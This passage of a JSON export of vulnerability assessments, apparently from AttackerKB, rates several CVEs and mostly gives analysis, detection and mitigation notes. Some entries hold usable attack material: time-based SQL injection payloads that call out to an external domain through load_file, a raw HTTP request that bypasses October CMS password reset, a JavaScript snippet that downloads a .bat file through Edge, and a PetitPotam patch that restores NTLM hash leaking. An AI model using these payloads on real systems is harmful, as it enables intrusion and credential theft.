      "revisionDate": "2023-05-17T07:27:38.106139Z",
      "document": "## [CVE-2021-44655](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44655)\r\n\r\n## [Software](https://www.sourcecodester.com/php/15067/online-pre-ownedused-car-showroom-management-system-php-free-source-code.html)\r\n\r\n## [Vendor](https://www.sourcecodester.com/users/tips23)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-44655/docs/Screenshot%202021-12-21%20233803.png)\r\n\r\n\r\n## Description:\r\nThe `bid`, `c` & `id` parameters from /used_car_showroom/ node app on Online-Pre-owned/Used Car Showroom Management 1.0 system appear to be vulnerable to Multiple time-based blind SQL injection attacks. The payload '+(select load_file('\\\\2z2p3k6kl8xuxf3ykb2dc84ocfi8600orrfi29qy.nu11secur1typenetrationtestingengineer.net\\nxj'))+' was submitted in the bid parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can take administrator account control on this system. Status: CRITICAL\r\n\r\n[+] Payloads:\r\n\r\n- Multiple: `bit`, `c` & `id`\r\n\r\n```mysql\r\n---\r\nParameter: bid (GET)\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: page=product_per_brand&bid=7'+(select load_file('\\\\\\\\2z2p3k6kl8xuxf3ykb2dc84ocfi8600orrfi29qy.nu11secur1typenetrationtestingengineer.net\\\\nxj'))+'' AND (SELECT 3670 FROM (SELECT(SLEEP(5)))hxug) AND 'ovPl'='ovPl\r\n---\r\n\r\n\r\n---\r\nParameter: c (GET)\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: page=categories&c=2'+(select load_file('\\\\\\\\xyzk2f5fk3wpwa2tj618b33jbah35vvjmmadx4lt.nu11secur1typenetrationtestingengineers.net\\\\thk'))+'' AND (SELECT 4821 FROM (SELECT(SLEEP(3)))DuhP) AND 'vkhG'='vkhG\r\n---\r\n\r\n\r\n---\r\nParameter: id (GET)\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: page=view_product&id=3'+(select load_file('\\\\\\\\rc7eg9j9yxaja4gnx0f2pxhdp4vxj17sag13srh.nu11secur1typenetrationtestingengineers.net\\\\deo'))+'' AND (SELECT 8828 FROM (SELECT(SLEEP(3)))VaSc) AND 'gDVf'='gDVf\r\n---\r\n\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-44655)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2021/12/cve-2021-44655.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9d76281a-3081-44ff-aa3f-02f5fc92648c",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "691fe896-c4df-492a-bf1b-2e720f24cb12",
      "created": "2022-01-14T09:36:56.216633Z",
      "revisionDate": "2022-01-14T09:36:56.217203Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/rJw4DFI2RQ/cve-2021-44515/rapid7-analysis).",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a2bcc488-8946-4ea8-9d46-cb101ac5d1de",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "eb3f5389-7a37-45e3-af6f-6c5b475789c9",
      "created": "2022-01-14T17:01:27.727492Z",
      "revisionDate": "2022-03-07T20:09:42.712331Z",
      "document": "### Ovewrview\r\n\r\nThis is a simple Type Confusion / Juggling vulnerability. \r\n\r\nOctober CMS will check to see if the User Supplied reset code matches the value in the database `return ($this->reset_password_code == $resetCode);`\r\nIf we can send a boolean value in place of a reset code we can bypass this check. \r\n\r\nLaravel has a feature that if an HTTP POST request is sent as JSON then It will be converted to a matching form data set however the types will persist. \r\n\r\nTo exploit this vulnerability we simply need to set the `Content-Type` to JSON and structure our POST request accordingly. An example POST is shown below. \r\n\r\n```\r\nPOST /backend/backend/auth/reset/1/[] HTTP/1.1\r\nHost: 172.17.0.2\r\nContent-Length: 162\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: http://172.17.0.2\r\nContent-Type: application/json\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://172.17.0.2/backend/backend/auth/reset/1/a\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nCookie: october_session=eyJpdiI6ImlGZHMrRTVEUGh6dHkxWllEeVF5dEE9PSIsInZhbHVlIjoiV2tkcmsrbkJxa2R6OWg1TVFLbTQ2Y1pTSG9ZT1RYTEFwdlY0YVVRVEU5a0pxbG5LdE81WVpXeDdGa3pHclhTWGhkbEE2WGZPME82aEpVWFBqcktEakR6Qng3WVpsWUdzYm9mOG9cL0YxTjNXbXFyUEZxWGNVM1BrcmJLaFVIZXVaIiwibWFjIjoiZmVkMDljNGE2MDc2ZGI5NjgyOThkMDJjZGFhNDcxYzg3MTNlNmJhZTRiYmIzZmVkYjNmYTUyMzA4ZjQxMjdiNiJ9\r\nConnection: close\r\n\r\n{\"_session_key\":\"RQjdfLkFotyuA4BHOjVykboK3DHByTyDFEs7xZXC\",\"_token\":\"jBD7MXYuIrYC4n0GClVCigIBrSOShoUICwy3gShS\",\"postback\":1,\"id\":1,\"code\":true,\"password\":\"hello\"}\r\n```\r\n\r\n### In the Wild\r\n\r\nThis has not been verified but initial reports suggest this vulnerability was used to deface a set of Ukrainian government websites - https://twitter.com/KimZetter/status/1481890639029551106\r\n\r\n### PoC\r\n\r\nA proof of concept python script that will attempt to reset the password for the admin account has been published - https://github.com/Immersive-Labs-Sec/CVE-2021-32648\r\n\r\n### Detection\r\nAn attacker attempting to exploit this attack will need to trigger a password reset email. If you observe password reset emails then check access to the server and respond accordingly. \r\n\r\n### Mitigation\r\n\r\nApplying the patches will successfully mitigate against this attack. ",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "b1c8860c-73fa-4630-84bc-9e37ddc5ee4d",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "9e1e5a73-8c4d-4a6a-96a5-14a9041aa2cb",
      "created": "2022-01-18T16:35:18.739144Z",
      "revisionDate": "2022-01-18T16:35:18.738488Z",
      "document": "Looks like this is a LPE in win32k that is being exploited in the wild according to Microsoft to let attackers escalate their privileges to SYSTEM. Attack complexity on this is high which is understandable given the history of win32k and the complexities regarding its architecture which was built before modern security mitigations were implemented. With that being said though the finder of this bug, at https://twitter.com/b2ahex/status/1481233350840893442, notes that exploitation is easy and that this is a patch bypass for CVE-2021-1732, which was a window object type confusion leading to an OOB (out-of-bounds) write as noted by McAfee's technical writeup at https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/technical-analysis-of-cve-2021-1732/.\r\n\r\nOf particular note here is that they credit Big CJTeam of Tianfu Cup and RyeLv aka @b2ahex on Twitter for finding this vulnerability. They note that this was exploited in the wild but the mention of Tianfu Cup is interesting as it suggests this was also reported to China's government via the Chinese Tianfu Cup hacking competition.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "f311f44f-b0f3-4dc1-8140-f4bd7b842e31",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "b6c6a49c-2895-4a0e-b367-f655b0b274ab",
      "created": "2022-01-18T16:54:51.482348Z",
      "revisionDate": "2022-01-18T17:05:30.681202Z",
      "document": "Seems after this analysis the risk was updated around July 2019 to be a high severity vulnerability. Technically this is a heap overflow with the potential side effect of SSL VPN web service termination for logged in users, however the bug may also result in remote code execution. @wwoolwine-r7's assessment in my opinion fails to appropriately take this into account as it considers the side effect the main impact of this bug, rather than the fact that this can and has been exploited in the wild for remote code execution.\r\n\r\nA full technical writeup of this bug can be found at https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html where it is noted that this is a post auth vulnerability that occurs due to a `memcpy` into a heap buffer using the code `memcpy(buffer, js_buf, js_buf_len);`. It also notes that `buffer` is a fixed 0x2000 byte long buffer however the length of `js_buf` is not limited and can be as long as the attacker wants it to be. They also note that to trigger this bug, an attacker would need to host their own HTTP server. They would then use the SSL VPN web-mode, which allows users to connect to various resources such as HTTP, FTP, RDP, etc via their web browser and will result in the SSL VPN server to requesting resources on their behalf, to connect to the malicious HTTP server and fetch their exploit on their behalf, which will result in the heap overflow.\r\n\r\nExploitation of this vulnerability can be prevented by ensuring all users have secure passwords with a mix of alphanumberic, uppercase, lowercase, and symbols of at least 20 characters or more. Remember that in general whilst having a mix of characters is good, length generally tends to help more than the mix of characters, however it is still highly recommended to use a mix of characters wherever possible.\r\n\r\nExploitation can also be prevented by disabling SSL VPN web-mode, and using SSL VPN tunnel-mode instead as it is not impacted.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c1b02877-4afb-4ba7-abbf-ea10598b5a09",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "d5ac93b4-5fbb-4b1c-91ba-e2c3c3e1afd1",
      "created": "2022-01-18T20:41:21.250175Z",
      "revisionDate": "2023-05-17T07:09:06.880723Z",
      "document": "## [CVE-2022-21970](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21970)\r\n\r\n## Description\r\nMicrosoft Edge (Chromium-based) Elevation of Privilege Vulnerability. \r\nThis vulnerability allows an attacker to execute javascript code on every host without permission, also an attacker can steal local system files, and also he can manipulate the actions against the machine and result in changing internal developer settings in Microsoft Edge.\r\n\r\n- NOTE: In this example, Microsoft Edge executes a malicious script without problems.\r\nThis is just a malicious .bat file that reboots the infected machine, and it's only for testing!\r\nThe attacker can create a malicious file that can take a privileges escalation, malware, spyware, or kernel exploit file and harm seriously your device!\r\nNot correctly sanitizing and checking for that what users download on their machines by using a MsEdge!\r\n\r\nNOTE after the exploit: A malicious user, or whatever user can execute directly malicious .bat files which are created - generated from this javascript exploit by using MsEdge. \ud83d\ude01\r\nAccording to Edge, this file is safe to run and open. \ud83d\ude01\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n## FAQ\r\nWhat is the version information for this release?\r\n\r\nMicrosoft Edge Version\tDate Released\tBased on Chromium Version\r\n\r\n97.0.1072.55 | 1/6/2022\t | 97.0.4692.71\r\n\r\n## STATUS:\r\n- Patched and fixed on!\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows10Exploits/master/2022/CVE-2022-21970/Docs/Edge-Fix.png)\r\n\r\n------------------------------------------------------------------------------------------------------------\r\n\r\n# The next test is checking if this is fully patched! \ud83e\udd2b \ud83d\ude1b \ud83d\ude0e\r\n\r\n## Proof and simple browser test MsEdge: Edge is blocking `.sys` files because they can harm your device:\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows10Exploits/master/2022/CVE-2022-21970/Docs/edge-patch.png)\r\n\r\n## This proof of concept is shown as to how the MsEdge browser NOT blocking `.bat` files, and this is a problem.\r\n\r\n- NOTE: A malicious user, or whatever user can execute directly malicious `.bat` files which are created - generated by using exactly MsEdge and this `javascript exploit`. \r\n- This is ridiculous and incorrect sanitizing!\ud83d\ude01\r\n- According to Edge, this file is safe to run and open. \ud83d\ude01\r\n\r\n- Screenshot, example:\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows10Exploits/master/2022/CVE-2022-21970/Docs/Screenshot%202022-01-18%20122501.png)\r\n\r\n## In Action:\r\n\r\n1. download the PoC\r\n\r\n2. extracted somewhere\r\n\r\n3. Execute\r\n\r\n```cmd\r\nstart msedge C:\\Users\\user2022\\Desktop\\ExploitServer\\examples\\exploit.html\r\n```\r\n## Example from the function():\r\n\r\n```java\r\n    $start.onclick = () => {\r\n        const blob = new Blob(['shutdown /r'])\r\n        const fileStream = streamSaver.createWriteStream('pwned.bat', {\r\n          size: blob.size // Makes the percentage visiable in the download\r\n        })\r\n\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/Windows10Exploits/edit/master/2022/CVE-2022-21970)\r\n\r\n## Proof and Exploit:\r\n\r\n[href](https://www.nu11secur1ty.com/2022/01/cve-2022-21970.html)\r\n\r\n- BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "6117a8ae-1b5f-4afd-8863-3b2108b16347",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "3d6bdab1-02a9-4280-9dfc-952a6d26b438",
      "created": "2022-01-18T22:32:59.432781Z",
      "revisionDate": "2022-02-01T22:19:11.12825Z",
      "document": "Attacker value is very high because [CVE-2021-26914](https://nvd.nist.gov/vuln/detail/CVE-2021-26914) is RCE as `SYSTEM` in a mobile VPN server, and successful exploitation may allow an attacker to pivot into an internal network.\r\n\r\nExploitability is also very high because the vulnerability can be trivially exploited in a single, unauthenticated HTTP request.\r\n\r\nTechnical details [have already been published](https://ssd-disclosure.com/ssd-advisory-netmotion-mobility-server-multiple-deserialization-of-untrusted-data-lead-to-rce/). A [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/netmotion_mobility_mvcutil_deserialization.rb) and an InsightVM check are both available.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "de20bb36-10a0-4084-b89d-3ccc937a95bd",
      "editorId": "f2b517ae-fc57-4178-b910-bdb3e4e41951",
      "topicId": "af11b0f1-11a7-4a56-89db-506d144c7e72",
      "created": "2022-01-19T09:41:58.090561Z",
      "revisionDate": "2022-01-19T09:41:58.090303Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "db8db63d-7e6f-4203-b1ae-aef5e9f62052",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "96b0c56f-dba6-4f34-b0b1-479738fb5b95",
      "created": "2022-01-19T21:56:33.771963Z",
      "revisionDate": "2022-02-01T22:18:54.589894Z",
      "document": "[CVE-2021-34481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34481) was the result of two features intended to make the standard (non-administrative) Windows user's life easier:\r\n\r\n1. Adding a remote printer did not require administrative access. Just point your computer at the remote printer and print.\r\n2. Adding a printer whose drivers were in the driver store did not require administrative access.\r\n\r\nThese two mechanisms combined allowed a low privileged Windows user to add arbitrary *signed* drivers to the driver store and then install them at will. A low privileged user could install a vulnerable print driver and exploit it to achieve `SYSTEM` privileges. In the DEF CON 29 talk *[Bring Your Own Vulnerable Print Driver](youtube.com/watch?v=vdesswZYz-8)*, the example vulnerable drivers were [Lexmark Universal Print Driver (CVE-2021-35449) ](https://nvd.nist.gov/vuln/detail/CVE-2021-35449), [Canon TR150 Print Driver (CVE-2021-38085)](https://nvd.nist.gov/vuln/detail/CVE-2021-38085), and [Ricoh PCL6 Print Driver (CVE-2019-19363)](https://nvd.nist.gov/vuln/detail/CVE-2019-19363).\r\n\r\nMicrosoft [patched this issue](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872) by, essentially, removing the ability for a low privileged user to easily install a remote printer.\r\n\r\nAn exploit with some additional details was posted on [GitHub](https://github.com/jacob-baines/concealed_position).",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "3c72090e-5ea1-437f-ab5a-72ec5c6a1d59",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "1196baf9-a467-480d-a40c-f3e93d5888d6",
      "created": "2022-01-25T16:35:20.598198Z",
      "revisionDate": "2022-02-01T22:17:48.010781Z",
      "document": "Recently, I was attempting to combine James Forshaw\u2019s [remote EFSRPC file write \u201cbug\u201d](https://twitter.com/tiraniddo/status/1481633916507209737) with a local privilege escalation that I\u2019d discovered. I was getting strange results. Working on one system, but not another at the same patch level. I\u2019d seriously polluted that environment with Windows Endpoint Manager, so I decided to spin up a fresh AD environment in hopes of establishing a trustworthy baseline.\r\n\r\nOnce I\u2019d stood up the new AD environment, and patched everything completely (through January 2022), I retested my proof of concept and was\u2026 unhappy and more than a bit confused with the result. Seeking additional feedback, I grabbed PetitPotam off the shelf since it's a simpler attack. But that didn\u2019t work either! That\u2019s when I found the following in the event log.\r\n\r\n\r\n![EFS Error](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/59c51ac3e642e8a46278d0453365a79ca7fef2c5/KB5009763/efs_error.png)\r\n\r\n\r\nWhich lead me to [KB5009763: EFS security hardening changes in CVE-2021-43217](https://support.microsoft.com/en-au/topic/kb5009763-efs-security-hardening-changes-in-cve-2021-43217-719fbc9d-ad9b-4f90-a964-0afe40338002). [CVE-2021-43217](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43217) is a buffer overflow affecting EFS, but it isn\u2019t related to what I was attempting to do. Regardless, the way Microsoft decided to address this CVE was to require EFSRPC clients to use packet-level privacy, and, at the time of testing, the PetitPotam proof of concept didn\u2019t.\r\n\r\nWe can further prove that out by creating the registry key mentioned by the KB to disable this behavior: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EFS\\AllowAllCliAuth. Setting this key to \u20181\u2019 allows PetitPotam to successfully leak the NTLM hash, but it also leaves this log message:\r\n\r\n\r\n![EFS Error](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/59c51ac3e642e8a46278d0453365a79ca7fef2c5/KB5009763/efs_warning.png)\r\n\r\nGreat! PetitPotam still works, but this registry key is unlikely to be enabled in the wild. It doesn\u2019t even exist by default!\r\n\r\nThe obvious solution is just to enable privacy level authentication in PetitPotam. That happens to be quite trivial. Just use the [`RpcBindingSetAuthInfo`](https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfow) function after the binding handle has been created. The following is a patch I added to my local PetitPotam to test enabling privacy level authentication.\r\n\r\n```\r\nalbinolobster@ubuntu:~/PetitPotam$ cat diff \r\ndiff --git a/PetitPotam/PetitPotam.cpp b/PetitPotam/PetitPotam.cpp\r\nindex 1885eb2..debbd1e 100644\r\n--- a/PetitPotam/PetitPotam.cpp\r\n+++ b/PetitPotam/PetitPotam.cpp\r\n@@ -1,6 +1,7 @@\r\n // PetitPotam.cpp : Ce fichier contient la fonction 'main'. L'ex\u00e9cution du programme commence et se termine \u00e0 cet endroit.\r\n // Author: GILLES Lionel aka topotam (@topotam77)\r\n \r\n+#include <string>\r\n #include <stdio.h>\r\n #include <tchar.h>\r\n #include <assert.h>\r\n@@ -60,6 +61,18 @@ handle_t Bind(wchar_t* target)\r\n \t\twprintf(L\"Error in RpcBindingFromStringBindingW\\n\");\r\n \t\treturn(0);\r\n \t}\r\n+\r\n+\tstd::wstring spn(L\"HOST/\");\r\n+\tspn.append(target);\r\n+\r\n+\tRpcStatus = RpcBindingSetAuthInfoW(BindingHandle, reinterpret_cast<RPC_WSTR>(&spn[0]), RPC_C_AUTHN_LEVEL_PKT_PRIVACY,\r\n+\t\tRPC_C_AUTHN_GSS_NEGOTIATE, nullptr, RPC_C_AUTHZ_NONE);\r\n+\tif (RpcStatus != 0)\r\n+\t{\r\n+\t\twprintf(L\"Error in RpcBindingFromStringBindingW\\n\");\r\n+\t\treturn(0);\r\n+\t}\r\n+\r\n \t\r\n \tRpcStringFreeW(&StringBinding);\r\n```\r\n\r\nNote the use of `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` for the `AuthnLevel`. This small change is all that is needed to make PetitPotam work again.\r\n\r\nBecause I experienced a weird update in one of my AD environments, I figured a video demonstrating all of the above would be useful. You can find the video on [here](https://share.vidyard.com/watch/s12ar9ni6fGLBwdnSW1ywn?).\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "fb1a3102-461e-45b7-b53f-40de645f4031",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "e4ed806f-551c-4dc1-b0d5-5eb8f7d1045d",
      "created": "2022-01-26T13:28:08.231776Z",
